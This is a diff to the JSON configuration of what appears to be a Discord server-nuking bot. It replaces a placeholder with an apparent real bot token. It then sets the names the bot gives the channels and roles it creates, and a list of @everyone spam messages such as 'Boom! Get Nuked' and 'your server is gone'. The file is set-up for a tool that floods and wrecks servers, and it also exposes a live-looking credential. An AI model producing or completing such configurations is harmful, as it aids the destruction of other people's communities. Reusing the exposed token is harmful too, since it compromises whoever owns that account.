@@ -1,7 +1,7 @@
 {
-"bot_token": "Bot Token",
-"prefix": "$",
-"channelnames": "Axe Runs Cord",
-"rolenames": "AXES RUNS CORD",
-"spam_text": ["@everyone Axes Runs Cord", "@everyone Boom! Get Nuked", "@everyone Axes Are Cool", "@everyone Beamed"]
+"bot_token": "MTQ5MzA5NDI0NDg4NDQxODYxMA.Gp9K5K.ds3Ia7TEOYdVxcNrHNLuM5J8zoixiR1xI7KFU0",
+"prefix": ">",
+"channelnames": "I RUN YOU",
+"rolenames": "CANT DO NOTHING",
+"spam_text": ["@everyone YOU CANT STOP ME", "@everyone Boom! Get Nuked", "@everyone your server is gone", "@everyone Beamed"]
 }
